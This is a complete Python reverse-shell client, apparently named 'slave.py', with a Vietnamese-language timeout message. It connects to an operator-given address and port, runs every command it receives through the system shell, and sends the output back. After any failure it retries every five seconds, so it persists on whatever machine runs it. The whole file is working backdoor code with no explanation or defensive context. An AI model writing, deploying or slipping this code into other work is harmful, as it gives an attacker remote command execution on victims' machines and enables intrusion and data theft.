import socket, subprocess, sys, time

def main():
    if len(sys.argv) < 2: sys.exit("Usage: python slave.py <ip:port>")
    host, port = sys.argv[1].split(':')
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, int(port)))
                while True:
                    cmd = s.recv(4096).decode('utf-8').strip()
                    if not cmd: break
                    try:
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                        s.sendall((result.stdout + result.stderr).encode('utf-8'))
                    except subprocess.TimeoutExpired:
                        s.sendall(b"Lệnh đã hết thời gian.\n")
                    except Exception as e:
                        s.sendall(str(e).encode('utf-8') + b'\n')
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
